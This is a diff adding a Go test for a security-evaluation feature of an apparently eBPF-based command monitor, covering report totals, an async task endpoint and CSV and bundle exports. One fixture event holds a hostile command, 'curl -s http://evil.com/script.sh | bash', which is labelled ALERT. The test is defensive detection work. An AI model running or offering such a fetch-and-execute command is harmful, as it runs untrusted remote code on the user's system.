@@ -217,6 +217,128 @@ func TestResearchSessionHandlersBuildResultsAndExports(t *testing.T) {
 	}
 }
 
+func TestResearchSecurityEvaluationTaskAndExports(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+	store, _ := restoreResearchV2TestState(t)
+
+	session, err := store.Create(researchCreateSessionRequest{Name: "security eval"})
+	if err != nil {
+		t.Fatalf("create session: %v", err)
+	}
+	events := []ResearchEvent{
+		{
+			ID:             "evt-safe",
+			Timestamp:      time.UnixMilli(1710000300000).UnixMilli(),
+			Time:           time.UnixMilli(1710000300000).UTC().Format(time.RFC3339Nano),
+			Source:         "ebpf",
+			EventType:      "wrapper_intercept",
+			Comm:           "git",
+			Target:         "git status",
+			Decision:       "ALLOW",
+			RiskScore:      5,
+			RedactionLevel: "standard",
+			Features:       map[string]any{"commandLine": "git status"},
+		},
+		{
+			ID:             "evt-risk",
+			Timestamp:      time.UnixMilli(1710000310000).UnixMilli(),
+			Time:           time.UnixMilli(1710000310000).UTC().Format(time.RFC3339Nano),
+			Source:         "ebpf",
+			EventType:      "wrapper_intercept",
+			Comm:           "bash",
+			Target:         "bash -c curl -s http://evil.com/script.sh | bash",
+			Decision:       "ALERT",
+			RiskScore:      95,
+			RedactionLevel: "standard",
+			Features:       map[string]any{"commandLine": "bash -c curl -s http://evil.com/script.sh | bash"},
+		},
+	}
+	if err := store.ReplaceSessionEvents(session.ID, events, buildResearchResults(session.ID, events, nil), ResearchSourceFilter{}, ResearchTimeRange{}); err != nil {
+		t.Fatalf("replace events: %v", err)
+	}
+
+	sessionReport, err := buildResearchSecurityEvaluationReport(session.ID, events, ResearchSecurityEvaluationRequest{Mode: "session", LabelPolicy: "decision"}, nil)
+	if err != nil {
+		t.Fatalf("build session security report: %v", err)
+	}
+	if sessionReport.Totals.Session != 2 || sessionReport.Totals.Builtin != 0 || sessionReport.Totals.Labeled != 2 {
+		t.Fatalf("session report totals mismatch: %+v", sessionReport.Totals)
+	}
+
+	router := gin.New()
+	registerResearchRoutes(router.Group("/research"), nil)
+	rec := httptest.NewRecorder()
+	req := httptest.NewRequest(http.MethodPost, "/research/sessions/"+session.ID+"/tasks", strings.NewReader(`{"action":"security_eval","evaluationMode":"builtin","includeLLM":false}`))
+	req.Header.Set("Content-Type", "application/json")
+	router.ServeHTTP(rec, req)
+	if rec.Code != http.StatusAccepted {
+		t.Fatalf("security eval task status=%d body=%s", rec.Code, rec.Body.String())
+	}
+	var task ResearchTask
+	if err := json.Unmarshal(rec.Body.Bytes(), &task); err != nil {
+		t.Fatalf("decode task: %v", err)
+	}
+	deadline := time.Now().Add(3 * time.Second)
+	for time.Now().Before(deadline) {
+		rec = httptest.NewRecorder()
+		req = httptest.NewRequest(http.MethodGet, "/research/tasks/"+task.TaskID, nil)
+		router.ServeHTTP(rec, req)
+		if rec.Code != http.StatusOK {
+			t.Fatalf("get task status=%d body=%s", rec.Code, rec.Body.String())
+		}
+		_ = json.Unmarshal(rec.Body.Bytes(), &task)
+		if task.Status == researchTaskSucceeded || task.Status == researchTaskFailed {
+			break
+		}
+		time.Sleep(10 * time.Millisecond)
+	}
+	if task.Status != researchTaskSucceeded || task.Records != len(benchmarkCases) {
+		t.Fatalf("security eval task mismatch: %+v", task)
+	}
+
+	rec = httptest.NewRecorder()
+	req = httptest.NewRequest(http.MethodGet, "/research/sessions/"+session.ID+"/results", nil)
+	router.ServeHTTP(rec, req)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("results status=%d body=%s", rec.Code, rec.Body.String())
+	}
+	var results ResearchResults
+	if err := json.Unmarshal(rec.Body.Bytes(), &results); err != nil {
+		t.Fatalf("decode results: %v", err)
+	}
+	if results.SecurityEvaluation == nil {
+		t.Fatal("missing security evaluation report")
+	}
+	if results.SecurityEvaluation.Mode != "builtin" || results.SecurityEvaluation.Totals.Builtin != len(benchmarkCases) || results.SecurityEvaluation.Totals.Session != 0 {
+		t.Fatalf("security evaluation report mismatch: %+v", results.SecurityEvaluation.Totals)
+	}
+	if results.SecurityEvaluation.Metrics.Accuracy < 0 || len(results.SecurityEvaluation.ConfusionMatrix) == 0 {
+		t.Fatalf("security evaluation metrics/matrix mismatch: %+v", results.SecurityEvaluation)
+	}
+	totalSamples, labeledSamples := globalTrainingStore.Status()
+	if totalSamples != 0 || labeledSamples != 0 {
+		t.Fatalf("security evaluation must not mutate training store: total=%d labeled=%d", totalSamples, labeledSamples)
+	}
+
+	rec = httptest.NewRecorder()
+	req = httptest.NewRequest(http.MethodGet, "/research/sessions/"+session.ID+"/export?format=security-csv", nil)
+	router.ServeHTTP(rec, req)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("security csv export status=%d body=%s", rec.Code, rec.Body.String())
+	}
+	if !strings.Contains(rec.Header().Get("Content-Type"), "text/csv") || !strings.Contains(rec.Body.String(), "expected_action") {
+		t.Fatalf("security csv export mismatch type=%q body=%s", rec.Header().Get("Content-Type"), rec.Body.String())
+	}
+
+	ref, payload, err := store.ExportArtifact(session.ID, "bundle")
+	if err != nil {
+		t.Fatalf("bundle after security eval: %v", err)
+	}
+	if ref.Format != "bundle" || !bytes.Contains(payload, []byte("security-evaluation.json")) || !bytes.Contains(payload, []byte("security-evaluation.csv")) {
+		t.Fatalf("security bundle artifact mismatch ref=%+v len=%d", ref, len(payload))
+	}
+}
+
 func TestResearchTaskQueueFullAndCancelIdempotent(t *testing.T) {
 	store := newResearchSessionStore(t.TempDir())
 	session, err := store.Create(researchCreateSessionRequest{Name: "queue"})
